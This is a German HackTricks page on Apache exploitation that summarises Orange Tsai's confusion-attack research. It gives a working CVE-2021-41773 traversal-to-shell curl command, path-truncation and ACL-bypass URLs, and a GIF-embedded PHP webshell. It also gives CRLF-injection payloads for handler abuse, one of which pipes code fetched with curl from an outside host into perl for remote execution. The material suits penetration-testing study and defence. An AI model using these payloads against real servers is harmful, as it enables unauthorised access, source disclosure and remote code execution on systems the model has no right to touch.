# Apache

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Ausf√ºhrbare PHP-Erweiterungen

√úberpr√ºfe, welche Erweiterungen den Apache-Server ausf√ºhren. Um sie zu suchen, kannst du ausf√ºhren:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Auch einige Orte, an denen Sie diese Konfiguration finden k√∂nnen, sind:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773

{% code overflow="wrap" %}
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
{% endcode %}

## Verwirrungsangriff <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

Diese Arten von Angriffen wurden [**von Orange in diesem Blogbeitrag**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) eingef√ºhrt und dokumentiert, und das Folgende ist eine Zusammenfassung. Der "Verwirrungs"-Angriff missbraucht im Grunde, wie die Dutzenden von Modulen, die zusammenarbeiten, um einen Apache zu erstellen, nicht perfekt synchronisiert arbeiten, und das Modifizieren unerwarteter Daten in einigen von ihnen kann eine Schwachstelle in einem sp√§teren Modul verursachen.

### Dateinamenverwirrung

#### Trunkierung

Das **`mod_rewrite`** wird den Inhalt von `r->filename` nach dem Zeichen `?` k√ºrzen ([_**modules/mappers/mod\_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod\_rewrite.c#L4141)). Das ist nicht ganz falsch, da die meisten Module `r->filename` als URL behandeln. In anderen F√§llen wird dies jedoch als Dateipfad behandelt, was ein Problem verursachen w√ºrde.

* **Pfadtrunkierung**

Es ist m√∂glich, `mod_rewrite` wie im folgenden Regelbeispiel zu missbrauchen, um auf andere Dateien im Dateisystem zuzugreifen, indem einfach der letzte Teil des erwarteten Pfades entfernt wird, indem man ein `?` hinzuf√ºgt:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
#¬†the output of file `/var/user/orange/secret.yml`
```
* **Irref√ºhrende RewriteFlag-Zuweisung**

In der folgenden Rewrite-Regel wird die URL, solange sie mit .php endet, als php behandelt und ausgef√ºhrt. Daher ist es m√∂glich, eine URL zu senden, die mit .php endet, nachdem das `?`-Zeichen verwendet wurde, w√§hrend im Pfad ein anderer Dateityp (wie ein Bild) mit sch√§dlichem php-Code geladen wird:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

Es ist m√∂glich, auf Dateien zuzugreifen, auf die der Benutzer nicht zugreifen sollte, selbst wenn der Zugriff mit Konfigurationen wie: verweigert werden sollte.
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Dies liegt daran, dass PHP-FPM standardm√§√üig URLs empf√§ngt, die mit `.php` enden, wie `http://server/admin.php%3Fooo.php`, und da PHP-FPM alles nach dem Zeichen `?` entfernt, erm√∂glicht die vorherige URL das Laden von `/admin.php`, selbst wenn die vorherige Regel dies verboten hat.

### DocumentRoot Verwirrung
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Ein interessanter Fakt √ºber Apache ist, dass die vorherige Umschreibung versucht, die Datei sowohl aus dem documentRoot als auch aus dem Root-Verzeichnis zuzugreifen. Eine Anfrage an `https://server/abouth.html` wird die Datei in `/var/www/html/about.html` und `/about.html` im Dateisystem √ºberpr√ºfen. Dies kann im Grunde genommen missbraucht werden, um auf Dateien im Dateisystem zuzugreifen.

#### **Server-Seitige Quellcode-Offenlegung**

* **Offenlegung des CGI-Quellcodes**

Es reicht aus, ein %3F am Ende hinzuzuf√ºgen, um den Quellcode eines cgi-Moduls offenzulegen:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
* **PHP-Quellcode offenlegen**

Wenn ein Server verschiedene Domains hat, wobei eine davon eine statische Domain ist, kann dies ausgenutzt werden, um das Dateisystem zu durchlaufen und PHP-Code offenzulegen:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Manipulation lokaler Gadgets**

Das Hauptproblem bei dem vorherigen Angriff ist, dass standardm√§√üig der Zugriff auf das Dateisystem in den meisten F√§llen verweigert wird, wie in der [Konfigurationsvorlage](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115) des Apache HTTP Servers:
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Allerdings erlauben die Betriebssysteme [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) standardm√§√üig `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Daher w√§re es m√∂glich, **Dateien, die sich in `/usr/share` in diesen Distributionen befinden, auszunutzen.**

**Lokales Gadget zur Informationsoffenlegung**

* **Apache HTTP Server** mit **websocketd** kann das **dump-env.php**-Skript unter **/usr/share/doc/websocketd/examples/php/** exponieren, was sensible Umgebungsvariablen offenlegen kann.
* Server mit **Nginx** oder **Jetty** k√∂nnten sensible Informationen von Webanwendungen (z.B. **web.xml**) √ºber ihre standardm√§√üigen Webwurzeln, die unter **/usr/share** platziert sind, exponieren:
* **/usr/share/nginx/html/**
* **/usr/share/jetty9/etc/**
* **/usr/share/jetty9/webapps/**

**Lokales Gadget zu XSS**

* Auf Ubuntu Desktop mit **LibreOffice installiert** kann das Ausnutzen der Sprachumschaltfunktion der Hilfedateien zu **Cross-Site Scripting (XSS)** f√ºhren. Das Manipulieren der URL unter **/usr/share/libreoffice/help/help.html** kann zu b√∂sartigen Seiten oder √§lteren Versionen √ºber **unsichere RewriteRule** umleiten.

**Lokales Gadget zu LFI**

* Wenn PHP oder bestimmte Front-End-Pakete wie **JpGraph** oder **jQuery-jFeed** installiert sind, k√∂nnen deren Dateien ausgenutzt werden, um sensible Dateien wie **/etc/passwd** zu lesen:
* **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
* **/usr/share/javascript/jquery-jfeed/proxy.php**
* **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Lokales Gadget zu SSRF**

* Durch die Nutzung von **MagpieRSS's magpie\_debug.php** unter **/usr/share/php/magpierss/scripts/magpie\_debug.php** kann eine SSRF-Schwachstelle leicht erstellt werden, die einen Zugang zu weiteren Exploits bietet.

**Lokales Gadget zu RCE**

* Die M√∂glichkeiten f√ºr **Remote Code Execution (RCE)** sind vielf√§ltig, mit anf√§lligen Installationen wie einer veralteten **PHPUnit** oder **phpLiteAdmin**. Diese k√∂nnen ausgenutzt werden, um beliebigen Code auszuf√ºhren, was das umfangreiche Potenzial der Manipulation lokaler Gadgets zeigt.

#### **Jailbreak von lokalen Gadgets**

Es ist auch m√∂glich, aus den erlaubten Ordnern auszubrechen, indem man Symlinks folgt, die von installierter Software in diesen Ordnern generiert wurden, wie:

* **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
* **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
* **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
* **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
* **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Dar√ºber hinaus war es durch das Ausnutzen von Symlinks m√∂glich, **RCE in Redmine zu erlangen.**

### Handler-Verwirrung <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Dieser Angriff nutzt die √úberlappung in der Funktionalit√§t zwischen den Direktiven `AddHandler` und `AddType`, die beide verwendet werden k√∂nnen, um **PHP-Verarbeitung zu aktivieren**. Urspr√ºnglich betrafen diese Direktiven unterschiedliche Felder (`r->handler` und `r->content_type` jeweils) in der internen Struktur des Servers. Aufgrund von Legacy-Code behandelt Apache jedoch diese Direktiven unter bestimmten Bedingungen austauschbar, indem `r->content_type` in `r->handler` umgewandelt wird, wenn erstere gesetzt ist und letztere nicht.

Dar√ºber hinaus verwendet der Apache HTTP Server (`server/config.c#L420`), wenn `r->handler` vor der Ausf√ºhrung von `ap_run_handler()` leer ist, **`r->content_type` als Handler**, was effektiv `AddType` und `AddHandler` identisch in der Wirkung macht.

#### **Handler √ºberschreiben, um PHP-Quellcode offenzulegen**

In [**diesem Vortrag**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013\_dmitriev-maksim.pdf) wurde eine Schwachstelle pr√§sentiert, bei der ein falsches `Content-Length`, das von einem Client gesendet wird, dazu f√ºhren kann, dass Apache f√§lschlicherweise **den PHP-Quellcode zur√ºckgibt**. Dies war auf ein Fehlerbehandlungsproblem mit ModSecurity und der Apache Portable Runtime (APR) zur√ºckzuf√ºhren, bei dem eine doppelte Antwort dazu f√ºhrt, dass `r->content_type` auf `text/html` √ºberschrieben wird.\
Da ModSecurity R√ºckgabewerte nicht richtig behandelt, w√ºrde es den PHP-Code zur√ºckgeben und nicht interpretieren.

#### **Handler √ºberschreiben, um XXXX**

TODO: Orange hat diese Schwachstelle noch nicht offengelegt

### **Willk√ºrliche Handler aufrufen**

Wenn ein Angreifer in der Lage ist, den **`Content-Type`**-Header in einer Serverantwort zu kontrollieren, kann er **willk√ºrliche Modul-Handler aufrufen**. Allerdings wird der Gro√üteil des Anforderungsprozesses bereits abgeschlossen sein, wenn der Angreifer dies kontrolliert. Es ist jedoch m√∂glich, **den Anforderungsprozess durch Ausnutzen des `Location`-Headers neu zu starten**, da, wenn der **r**√ºckgegebene `Status` 200 ist und der `Location`-Header mit einem `/` beginnt, die Antwort als serverseitige Umleitung behandelt wird und verarbeitet werden sollte.

Laut [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (Spezifikation √ºber CGI) definiert [Abschnitt 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) ein Verhalten f√ºr lokale Umleitungsantworten:

> Das CGI-Skript kann einen URI-Pfad und eine Abfragezeichenfolge (‚Äòlocal-pathquery‚Äô) f√ºr eine lokale Ressource in einem Location-Headerfeld zur√ºckgeben. Dies zeigt dem Server an, dass er die Anfrage mit dem angegebenen Pfad erneut verarbeiten soll.

Daher ist es notwendig, um diesen Angriff durchzuf√ºhren, eine der folgenden Schwachstellen zu haben:

* CRLF-Injection in den CGI-Antwort-Headern
* SSRF mit vollst√§ndiger Kontrolle √ºber die Antwort-Header

#### **Willk√ºrlicher Handler zur Informationsoffenlegung**

Zum Beispiel sollte `/server-status` nur lokal zug√§nglich sein:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
Es ist m√∂glich, darauf zuzugreifen, indem der `Content-Type` auf `server-status` und der Location-Header mit `/` beginnt.
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Arbitrary Handler to Full SSRF**

Umleitung zu `mod_proxy`, um auf jedes Protokoll unter jeder URL zuzugreifen:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Allerdings wird der `X-Forwarded-For`-Header hinzugef√ºgt, um den Zugriff auf Cloud-Metadatenendpunkte zu verhindern.

#### **Willk√ºrlicher Handler zum Zugriff auf lokale Unix-Domain-Sockets**

Greifen Sie auf den lokalen Unix-Domain-Socket von PHP-FPM zu, um ein PHP-Backdoor auszuf√ºhren, das sich in `/tmp/` befindet:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Willk√ºrlicher Handler zu RCE**

Das offizielle [PHP Docker](https://hub.docker.com/\_/php) Image enth√§lt PEAR (`Pearcmd.php`), ein Befehlszeilen-PHP-Paketverwaltungstool, das missbraucht werden kann, um RCE zu erlangen:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
√úberpr√ºfen Sie [**Docker PHP LFI Zusammenfassung**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), geschrieben von [Phith0n](https://x.com/phithon\_xg) f√ºr die Details dieser Technik.

## Referenzen

* [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
